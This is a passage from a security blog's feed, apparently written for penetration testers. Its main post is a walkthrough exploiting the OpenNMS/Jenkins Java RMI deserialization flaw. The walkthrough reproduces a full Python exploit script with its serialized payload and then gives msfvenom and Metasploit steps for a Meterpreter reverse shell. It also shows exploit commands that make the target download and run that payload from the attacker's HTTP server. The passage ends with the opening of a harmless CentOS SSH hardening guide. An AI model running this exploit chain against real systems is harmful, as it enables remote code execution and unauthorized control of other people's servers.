+<p><a href="https://www.facebook.com/sharer.php?u=/exploiting-ms17-010-using-eternalblue-and-doublepulsar-to-gain-a-remote-meterpreter-shell/">**</a> <a href="http://twitter.com/share?url=https://smittix.github.io/exploiting-ms17-010-using-eternalblue-and-doublepulsar-to-gain-a-remote-meterpreter-shell/&amp;text=Exploiting%20MS17-010%20%E2%80%93%20Using%20EternalBlue%20and%20DoublePulsar%20to%20gain%20a%20remote%20Meterpreter%20shell">**</a> <a href="mailto:?subject=Exploiting%20MS17-010%20%26#8211;%20Using%20EternalBlue%20and%20DoublePulsar%20to%20gain%20a%20remote%20Meterpreter%20shell&amp;body=/exploiting-ms17-010-using-eternalblue-and-doublepulsar-to-gain-a-remote-meterpreter-shell/">**</a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://smittix.github.io/exploiting-ms17-010-using-eternalblue-and-doublepulsar-to-gain-a-remote-meterpreter-shell/&amp;title=Exploiting%20MS17-010%20%E2%80%93%20Using%20EternalBlue%20and%20DoublePulsar%20to%20gain%20a%20remote%20Meterpreter%20shell">**</a> <a href="">**</a> <a href="https://t.me/share/url?url=https://smittix.github.io/exploiting-ms17-010-using-eternalblue-and-doublepulsar-to-gain-a-remote-meterpreter-shell/&amp;title=Exploiting%20MS17-010%20%E2%80%93%20Using%20EternalBlue%20and%20DoublePulsar%20to%20gain%20a%20remote%20Meterpreter%20shell">**</a> <a href="https://api.whatsapp.com/send?text=/exploiting-ms17-010-using-eternalblue-and-doublepulsar-to-gain-a-remote-meterpreter-shell/&amp;title=Exploiting%20MS17-010%20%E2%80%93%20Using%20EternalBlue%20and%20DoublePulsar%20to%20gain%20a%20remote%20Meterpreter%20shell">**</a> <a href="https://www.reddit.com/submit?url=https://smittix.github.io/exploiting-ms17-010-using-eternalblue-and-doublepulsar-to-gain-a-remote-meterpreter-shell/&amp;title=Exploiting%20MS17-010%20%E2%80%93%20Using%20EternalBlue%20and%20DoublePulsar%20to%20gain%20a%20remote%20Meterpreter%20shell">**</a> <a href="">**</a></p>
+</li>
+</ul>
+<h2 id="post-navigation">Post navigation</h2>
+<p><a href="/posts/exploiting-the-opennmsjenkins-rmi-java-deserialization-vulnerability/">Exploiting the OpenNMS/Jenkins RMI Java Deserialization Vulnerability</a><a href="/posts/quick-guide-to-installing-bloodhound-in-kali-rolling/">Quick Guide to Installing Bloodhound in Kali-Rolling</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Exploiting the OpenNMS/Jenkins RMI Java Deserialization Vulnerability</title>
+            <link>https://smittix.github.io/posts/exploiting-the-opennms/jenkins-rmi-java-deserialization-vulnerability/</link>
+            <pubDate>Wed, 14 Sep 2016 00:00:00 +0000</pubDate>
+            
+            <guid>https://smittix.github.io/posts/exploiting-the-opennms/jenkins-rmi-java-deserialization-vulnerability/</guid>
+            <description>&lt;p&gt;Even though this vulnerability was detected back in 2015 I am only starting to notice it popping up on engagements more frequently.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;CVE-2015-8103 – Jenkins CLI – RMI Java Deserialization&lt;/strong&gt; allows remote attackers to execute arbitrary code via a crafted serialized Java object. Apparently, according to Foxglove security Jenkins and OpenNMS are not the only ones that are affected by this issue, Websphere, Weblogic and JBoss are also affected.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://smittix.github.io/wp-content/uploads/2016/09/fb80719f5e73aa5c6970fc0457e73d20.jpg&#34;&gt;&lt;img src=&#34;https://smittix.github.io/wp-content/uploads/2016/09/fb80719f5e73aa5c6970fc0457e73d20-300x177.jpg&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p>Even though this vulnerability was detected back in 2015 I am only starting to notice it popping up on engagements more frequently.</p>
+<p><strong>CVE-2015-8103 – Jenkins CLI – RMI Java Deserialization</strong> allows remote attackers to execute arbitrary code via a crafted serialized Java object. Apparently, according to Foxglove security Jenkins and OpenNMS are not the only ones that are affected by this issue, Websphere, Weblogic and JBoss are also affected.</p>
+<p><a href="/wp-content/uploads/2016/09/fb80719f5e73aa5c6970fc0457e73d20.jpg"><img src="/wp-content/uploads/2016/09/fb80719f5e73aa5c6970fc0457e73d20-300x177.jpg" alt=""></a></p>
+<p>Whilst on a recent engagement I tried using the Metasploit module which was readily available but had problems running I then tried another module which was written by <a href="https://twitter.com/benpturner">Ben Turner</a> also to no avail, I am really not sure why those modules didn’t work for me but I had no time to debug and had to get something that worked sharpish, So I had to look for other ways and here I will show you what I came up with.</p>
+<h2 id="the-exploit">The Exploit</h2>
+<p>Firstly we need a working exploit. The python script I found by <strong><a href="https://github.com/CoalfireLabs">Coalfire Labs</a></strong> worked a treat for me and allowed me to send the commands needed to gain a shell over to the affected server.</p>
+<p>Here’s what the code looks like thanks to <strong><a href="https://github.com/CoalfireLabs/java_deserialization_exploits/blob/master/OpenNMS/opennms_rce.py">Pancho</a></strong> ```
+#! /usr/bin/env python3</p>
+<h1 id="credits">Credits:</h1>
+<h1><a href="http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#opennms">http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#opennms</a></h1>
+<h1 id="nessuspluginsopennms_java_serializenasl">nessus/plugins/opennms_java_serialize.nasl</h1>
+<h1 id="cobbled-together-by-pancho">cobbled together by pancho</h1>
+<p>import socket
+import sys</p>
+<p>def build(cmd):
+blob_header = &lsquo;\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x00\x00\x00\x50\xac\xed\x00\x05\x77\x22\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x44\x15\x4d\xc9\xd4\xe6\x3b\xdf\x74\x00\x05\x70\x77\x6e\x65\x64\x73\x7d\x00\x00\x00\x01\x00\x0f\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x52\x65\x6d\x6f\x74\x65\x70\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x70\x78\x70\x73\x72\x00\x32\x73\x75\x6e\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x61\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x2e\x41\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x55\xca\xf5\x0f\x15\xcb\x7e\xa5\x02\x00\x02\x4c\x00\x0c\x6d\x65\x6d\x62\x65\x72\x56\x61\x6c\x75\x65\x73\x74\x00\x0f\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4d\x61\x70\x3b\x4c\x00\x04\x74\x79\x70\x65\x74\x00\x11\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x70\x78\x70\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x70\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x71\x00\x7e\x00\x00\x73\x71\x00\x7e\x00\x05\x73\x7d\x00\x00\x00\x01\x00\x0d\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x4d\x61\x70\x70\x78\x71\x00\x7e\x00\x02\x73\x71\x00\x7e\x00\x05\x73\x72\x00\x2a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x6d\x61\x70\x2e\x4c\x61\x7a\x79\x4d\x61\x70\x6e\xe5\x94\x82\x9e\x79\x10\x94\x03\x00\x01\x4c\x00\x07\x66\x61\x63\x74\x6f\x72\x79\x74\x00\x2c\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x70\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x68\x61\x69\x6e\x65\x64\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x30\xc7\x97\xec\x28\x7a\x97\x04\x02\x00\x01\x5b\x00\x0d\x69\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x73\x74\x00\x2d\x5b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x70\x78\x70\x75\x72\x00\x2d\x5b\x4c\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\xbd\x56\x2a\xf1\xd8\x34\x18\x99\x02\x00\x00\x70\x78\x70\x00\x00\x00\x05\x73\x72\x00\x3b\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x6f\x6e\x73\x74\x61\x6e\x74\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x58\x76\x90\x11\x41\x02\xb1\x94\x02\x00\x01\x4c\x00\x09\x69\x43\x6f\x6e\x73\x74\x61\x6e\x74\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x70\x78\x70\x76\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x52\x75\x6e\x74\x69\x6d\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x49\x6e\x76\x6f\x6b\x65\x72\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x87\xe8\xff\x6b\x7b\x7c\xce\x38\x02\x00\x03\x5b\x00\x05\x69\x41\x72\x67\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0b\x69\x4d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x0b\x69\x50\x61\x72\x61\x6d\x54\x79\x70\x65\x73\x74\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x70\x78\x70\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x70\x78\x70\x00\x00\x00\x02\x74\x00\x0a\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x75\x72\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73\x3b\xab\x16\xd7\xae\xcb\xcd\x5a\x99\x02\x00\x00\x70\x78\x70\x00\x00\x00\x00\x74\x00\x09\x67\x65\x74\x4d\x65\x74\x68\x6f\x64\x75\x71\x00\x7e\x00\x24\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\xa0\xf0\xa4\x38\x7a\x3b\xb3\x42\x02\x00\x00\x70\x78\x70\x76\x71\x00\x7e\x00\x24\x73\x71\x00\x7e\x00\x1c\x75\x71\x00\x7e\x00\x21\x00\x00\x00\x02\x70\x75\x71\x00\x7e\x00\x21\x00\x00\x00\x00\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x75\x71\x00\x7e\x00\x24\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70\x76\x71\x00\x7e\x00\x21\x73\x71\x00\x7e\x00\x1c\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x70\x78\x70\x00\x00\x00\x01\x74&rsquo;
+blob_footer = &lsquo;\x74\x00\x04\x65\x78\x65\x63\x75\x71\x00\x7e\x00\x24\x00\x00\x00\x01\x71\x00\x7e\x00\x29\x73\x71\x00\x7e\x00\x17\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75\x65\x70\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x70\x78\x70\x00\x00\x00\x01\x73\x71\x00\x7e\x00\x09\x3f\x40\x00\x00\x00\x00\x00\x10\x77\x08\x00\x00\x00\x10\x00\x00\x00\x00\x78\x78\x76\x72\x00\x12\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x76\x65\x72\x72\x69\x64\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70\x71\x00\x7e\x00\x3f\x78\x71\x00\x7e\x00\x3f&rsquo;
+return blob_header + &lsquo;\x00&rsquo; + chr(len(cmd)) + cmd + blob_footer</p>
+<p>def exploit(cmd, host):
+blob_prologue = &lsquo;\x4a\x52\x4d\x49\x00\x02\x4b&rsquo;
+packet = build(cmd)</p>
+<p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((host, 1099))
+sock.send(blob_prologue)
+sock.recv(8192)
+sock.send(packet)
+sock.close()</p>
+<p>def main():
+print(&lsquo;OpenNMS Java Object Unserialization RCE implemented by pancho&rsquo;)</p>
+<p>if len(sys.argv) != 3:
+print(&lsquo;usage: python3 &rsquo; + sys.argv[0] + &rsquo; host cmd&rsquo;)
+return</p>
+<p>host = sys.argv[1]
+cmd = sys.argv[2]</p>
+<p>packet = build(cmd)
+exploit(cmd, host)</p>
+<p>if <strong>name</strong> == &ldquo;<strong>main</strong>&rdquo;:
+main()</p>
+<pre tabindex="0"><code>
+
+
+Before we go ahead and run the exploit there are a few things we need to setup.
+
+
+## Setting the Stage
+
+
+
+We will go ahead and use msf_venom to create the payload, type the following and make sure msf_venom is in your path. If it isn’t, then do the following first.
+</code></pre><p>cd /usr/share/metasploit-framework</p>
+<pre tabindex="0"><code>
+
+
+Okay, let’s go ahead and create the payload for our vulnerable Linux system.
+</code></pre><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_IP_ADDRESS LPORT=YOUR_PORT -f elf &gt; payload</p>
+<pre tabindex="0"><code>
+
+
+Once ran, you should have some output from venom telling you it’s saved the payload with no errors as per below.
+
+
+
+[![payload_create](/wp-content/uploads/2016/09/payload_create.png)](/wp-content/uploads/2016/09/payload_create.png)
+
+
+
+Cool! That’s your payload created, now we need to create a handler for your shiny new payload.
+
+
+
+Let’s fire up Metasploit, remember to start the database first.
+</code></pre><p>service postgresql start</p>
+<pre tabindex="0"><code>
+
+
+Then
+</code></pre><p>msfconsole</p>
+<pre tabindex="0"><code>
+
+
+[![msfconsole](/wp-content/uploads/2016/09/msfconsole.png)](/wp-content/uploads/2016/09/msfconsole.png)
+
+
+
+Once you’re at the MSF console we need to load the handler
+</code></pre><p>use exploit/multi/handler</p>
+<pre tabindex="0"><code>
+
+
+Now let’s tell it what payload we want to use.
+</code></pre><p>set PAYLOAD linux/x86/meterpreter/reverse_tcp</p>
+<pre tabindex="0"><code>
+
+
+We now need to set some parameters for the payload handler such as the IP and Port. This will be the same IP and Port that you used when you created your payload with MSF_Venom.
+</code></pre><p>show options</p>
+<pre tabindex="0"><code>
+
+
+[![screenshot-from-2016-09-14-11-00-47](/wp-content/uploads/2016/09/Screenshot-from-2016-09-14-11-00-47.png)](/wp-content/uploads/2016/09/Screenshot-from-2016-09-14-11-00-47.png)
+
+
+
+Let’s set the LHOST and LPORT parameters to those that we used in the MSF_Venom Payload.
+</code></pre><p>set LHOST 192.168.0.1</p>
+<pre tabindex="0"><code></code></pre><p>set LPORT 8081</p>
+<pre tabindex="0"><code>
+
+
+Double check that the settings have been set with the command..
+</code></pre><p>show options</p>
+<pre tabindex="0"><code>
+
+
+[![lhost-port](/wp-content/uploads/2016/09/lhost-port.png)](/wp-content/uploads/2016/09/lhost-port.png)
+
+
+
+Ok, they’re set, let’s run the handler.
+</code></pre><p>run</p>
+<pre tabindex="0"><code>
+
+
+[![handler-run](/wp-content/uploads/2016/09/handler-run.png)](/wp-content/uploads/2016/09/handler-run.png)
+
+
+## Recap
+
+
+ - We have created our Payload to send to the vulnerable system
+ - We have created a handler for the payload to connect to
+
+
+
+Now we need to send our payload to the vulnerable system via the exploit we downloaded earlier in the article.
+
+
+## Exploiting the System
+
+
+
+Fire up another terminal and leave the handler in the previous session running.
+
+
+
+Navigate to the directory where you created your payload and fire up a simple HTTP server with the help of python
+</code></pre><p>python -m SimpleHTTPServer 80</p>
+<pre tabindex="0"><code>
+
+
+[![screenshot-from-2016-09-14-11-25-31](/wp-content/uploads/2016/09/Screenshot-from-2016-09-14-11-25-31.png)](/wp-content/uploads/2016/09/Screenshot-from-2016-09-14-11-25-31.png)
+
+
+
+You now have functional HTTP server running, we’re now going to use the exploit script to send commands to the vulnerable server, we will grab our payload file, change it’s permissions and then execute it all via the exploit python code.
+
+
+
+Launch a new terminal window and navigate to the directory where you stored your exploit code and issue the following command to grab the payload file.
+
+
+##### Please Note: Your python file will be named differently
+</code></pre><p>python opennms.py IP_OF_OpenNMS &lsquo;wget http://yourlocalIP/yourpayload&rsquo;</p>
+<pre tabindex="0"><code>
+
+
+In your SimpleHTTPServer window, you should see a GET request with the status ‘200’
+</code></pre><p>&ldquo;GET / HTTP/1.1&rdquo; 200 -</p>
+<pre tabindex="0"><code>
+
+
+This means the vulnerable server has executed our wget command and grabbed the file from us.
+
+
+
+Let’s make it executable (We’re working blind here as there is no output from the server via the exploit code)
+</code></pre><p>python opennms.py IP_OF_OpenNMS &lsquo;chmod +x&rsquo;</p>
+<pre tabindex="0"><code>
+
+
+Then execute and hope for the best 🙂
+</code></pre><p>python opennms.py IP_OF_OpenNMS &lsquo;./payload&rsquo;</p>
+<pre tabindex="0"><code>
+
+
+Let’s have a look at the terminal session where our handler has been waiting. If the job was successful then you should be greeted with a meterpreter session.
+
+
+
+[![screenshot-from-2016-09-08-10-36-04](/wp-content/uploads/2016/09/Screenshot-from-2016-09-08-10-36-04.png)](/wp-content/uploads/2016/09/Screenshot-from-2016-09-08-10-36-04.png)
+
+
+
+Now it’s up to you where you go from here depending on the context of the user you are.
+
+
+
+I hope this helped some of you. If you have any tips/tricks on easier/quicker methods or anything you would do differently please get in touch or comment below.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### About The Author
+
+
+ -  [](/)
+
+       [**](https://www.facebook.com/sharer.php?u=/exploiting-the-opennmsjenkins-rmi-java-deserialization-vulnerability/) [**](http://twitter.com/share?url=https://smittix.github.io/exploiting-the-opennmsjenkins-rmi-java-deserialization-vulnerability/&amp;text=Exploiting%20the%20OpenNMS%2FJenkins%20RMI%20Java%20Deserialization%20Vulnerability) [**](mailto:?subject=Exploiting%20the%20OpenNMS/Jenkins%20RMI%20Java%20Deserialization%20Vulnerability&amp;body=/exploiting-the-opennmsjenkins-rmi-java-deserialization-vulnerability/) [**](https://www.linkedin.com/sharing/share-offsite/?url=https://smittix.github.io/exploiting-the-opennmsjenkins-rmi-java-deserialization-vulnerability/&amp;title=Exploiting%20the%20OpenNMS%2FJenkins%20RMI%20Java%20Deserialization%20Vulnerability) [**](javascript:pinIt();) [**](https://t.me/share/url?url=https://smittix.github.io/exploiting-the-opennmsjenkins-rmi-java-deserialization-vulnerability/&amp;title=Exploiting%20the%20OpenNMS%2FJenkins%20RMI%20Java%20Deserialization%20Vulnerability) [**](https://api.whatsapp.com/send?text=/exploiting-the-opennmsjenkins-rmi-java-deserialization-vulnerability/&amp;title=Exploiting%20the%20OpenNMS%2FJenkins%20RMI%20Java%20Deserialization%20Vulnerability) [**](https://www.reddit.com/submit?url=https://smittix.github.io/exploiting-the-opennmsjenkins-rmi-java-deserialization-vulnerability/&amp;title=Exploiting%20the%20OpenNMS%2FJenkins%20RMI%20Java%20Deserialization%20Vulnerability) [**](javascript:window.print())    
+## Post navigation
+
+ [CentOS 7 Server Hardening Guide](/posts/centos-7-server-hardening-guide/)[Exploiting MS17-010 – Using EternalBlue and DoublePulsar to gain a remote Meterpreter shell](/posts/exploiting-ms17-010-using-eternalblue-and-doublepulsar-to-gain-a-remote-meterpreter-shell/)
+</code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title>CentOS 7 Server Hardening Guide</title>
+            <link>https://smittix.github.io/posts/centos-7-server-hardening-guide/</link>
+            <pubDate>Wed, 03 Feb 2016 00:00:00 +0000</pubDate>
+            
+            <guid>https://smittix.github.io/posts/centos-7-server-hardening-guide/</guid>
+            <description>&lt;p&gt;So… you’ve just setup a shiny new server and you want to take measures to keep the bad guys out? Well, here I will give you a few tips on how to do just that.&lt;/p&gt;
+&lt;p&gt;This guide was written with &lt;a href=&#34;https://www.centos.org/&#34;&gt;CentOS 7.1&lt;/a&gt; in mind but other up-to-date variants such as &lt;a href=&#34;https://getfedora.org/&#34;&gt;Fedora&lt;/a&gt; and &lt;a href=&#34;https://www.redhat.com/en/technologies/linux-platforms/enterprise-linux&#34;&gt;RHEL&lt;/a&gt; should be pretty similar if not the same.&lt;/p&gt;
+&lt;h1 id=&#34;hardening-ssh-secure-shell&#34;&gt;Hardening SSH (Secure Shell)&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&#34;https://smittix.github.io/wp-content/uploads/2016/02/OpenSSH.png&#34;&gt;&lt;img src=&#34;https://smittix.github.io/wp-content/uploads/2016/02/OpenSSH-150x150.png&#34; alt=&#34;OpenSSH&#34;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Most of you will be using this protocol as a means to remotely administrate your Linux server and your right to. Using SSH is by far the best method to administer your server due to its use of encrypted communications unlike it’s older cousins rlogin and telnet which provide no secure methods of communication.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p>So… you’ve just setup a shiny new server and you want to take measures to keep the bad guys out? Well, here I will give you a few tips on how to do just that.</p>
+<p>This guide was written with <a href="https://www.centos.org/">CentOS 7.1</a> in mind but other up-to-date variants such as <a href="https://getfedora.org/">Fedora</a> and <a href="https://www.redhat.com/en/technologies/linux-platforms/enterprise-linux">RHEL</a> should be pretty similar if not the same.</p>
+<h1 id="hardening-ssh-secure-shell">Hardening SSH (Secure Shell)</h1>
+<p><a href="/wp-content/uploads/2016/02/OpenSSH.png"><img src="/wp-content/uploads/2016/02/OpenSSH-150x150.png" alt="OpenSSH"></a></p>
+<p>Most of you will be using this protocol as a means to remotely administrate your Linux server and your right to. Using SSH is by far the best method to administer your server due to its use of encrypted communications unlike it’s older cousins rlogin and telnet which provide no secure methods of communication.</p>
+<h2 id="create-a-standard-user">Create a standard user</h2>
+<p>Use the ‘useradd’ command to add a username of your choice.</p>
+<pre tabindex="0"><code>useradd YOURUSER
+</code></pre><p>Set a password for your newly created user.</p>
+<pre tabindex="0"><code>passwd YOURUSER
+</code></pre><p>Add your user to the WHEEL group to enable that user to use the sudo command.</p>
+<pre tabindex="0"><code>usermod -aG wheel YOURUSER
+</code></pre><h2></h2>
+<h2 id="create-an-authentication-key">Create an authentication key</h2>
+<p><a href="/wp-content/uploads/2016/02/RSA.png"><img src="/wp-content/uploads/2016/02/RSA-300x210.png" alt="RSA"></a></p>
+<p>This method of authenticating with your server is much more secure that using a standard password, part of this process will require you to create the key on your local machine which you will be connecting from.</p>
+<p>You will be asked if you would like to protect the key with a password, I advise you to do this but it’s not mandatory.</p>
+<h3 id="creating-the-key-on-maclinux">Creating the key on Mac/Linux</h3>
+<pre tabindex="0"><code>ssh-keygen -b 4096
+</code></pre><p>Press Enter to use the default names <strong>id_rsa</strong> and <strong>id_rsa.pub</strong> in <strong>/home/your_username/.ssh</strong> before entering your passphrase.</p>
+<h3 id="upload-your-public-key-to-your-server">Upload your public key to your server</h3>
+<h4 id="for-linux-">For <strong>Linux</strong> ```</h4>
+<p>ssh-copy-id YOURUSER@YOURSERVER</p>
+<pre tabindex="0"><code>
+
+#### For **Mac** On your server do.
+</code></pre><p>sudo mkdir -p ~/.ssh &amp;&amp; sudo chmod -R 700 ~/.ssh</p>
+<pre tabindex="0"><code>
+
+
+From your Mac do the following making sure to substitute ‘youruser’ and ‘yourserver’.
+</code></pre><p>scp <del>/.ssh/id_rsa.pub <a href="mailto:YOURUSER@YOURSERVER.0">YOURUSER@YOURSERVER.0</a>:</del>/.ssh/authorized_keys</p>
+<pre tabindex="0"><code>
+
+
+Now on to the configuration changes.
+
+
+### Open up the SSH config file for editing
+
+
+
+In this section we will be performing the following actions
+
+
+- Disallowing root logins
+- Setting allowed users
+- Changing the default port
+- Disabling password authentication
+- Force protocol 2
+
+
+
+You can replace nano with your favourite text editor such as vi.
+</code></pre><p>sudo nano /etc/ssh/sshd_config</p>
+<pre tabindex="0"><code>
+
+#### Disallow root logins.
+
+
+
+Find the line that says
+</code></pre><p>#PermitRootLogin yes</p>
+<pre tabindex="0"><code>
+
+
+and change it to
+</code></pre><p>PermitRootLogin no</p>
+<pre tabindex="0"><code>
+
+#### Setting your user as an allowed user.
+
+
+
+Add the following line to the bottom of your sshd_config file substituting ‘YOURUSER’ with your newly created account.
+</code></pre><p>AllowUsers YOURUSER</p>
+<pre tabindex="0"><code>
+
+#### Change the default service port.
+
+
+
+Find the line that says
+</code></pre><p>Port 22</p>
+<pre tabindex="0"><code>
+
+
+Change to something other than 22 such as 22000
+</code></pre><p>Port 22000</p>
+<pre tabindex="0"><code>
+
+#### Disabling password authentication
+
+
+
+We can disable password authentication because we will now be using our newly created key pair to authenticate to the server.
+
+
+
+Look for the line that has
+</code></pre><p>#PasswordAuthentication yes</p>
+<pre tabindex="0"><code>
+
+
+and replace it with the below line.
+</code></pre><p>PasswordAuthentication no</p>
+<pre tabindex="0"><code>
+
+#### Only use SSH protocol 2
+
+
+
+SSH Protocol 1 is generally considered obsolete as it’s vulnerable and old so lets go ahead and only use SSH Protocol 2. Protocol 2 should be enforced by default but it’s worth checking.
+
+
+
+Look for the line that says.
+</code></pre><p>#Protocol 2</p>
+<pre tabindex="0"><code>
+
+
+Uncomment the line so it looks like this.
+</code></pre><p>Protocol 2</p>
+<pre tabindex="0"><code>
+
+
+There are many more options that we could set but this should be suffice in securing your SSH Service.
+
+
+
+Save the file and restart the SSH service by doing the following.
+</code></pre><p>sudo systemctl reload sshd.service</p>
+<pre tabindex="0"><code>
+
+
+You should now be able to login on your chosen port with your authorised keys by connecting like this.
+</code></pre><p>ssh YOURUSER@YOURSERVER -p 22000</p>
+<pre tabindex="0"><code>
+
+# 
+
+
+# Fail2ban
+
+
+
+[Fail2ban](http://www.fail2ban.org/wiki/index.php/Main_Page) is a handy tool/service that monitors system log files to detect potential intrusion attempts and places bans using a variety of methods.
+
+
+
+To install on [CentOS](https://www.centos.org/) we need to enable the EPEL repository by doing the following.
+</code></pre><p>sudo yum install epel-release</p>
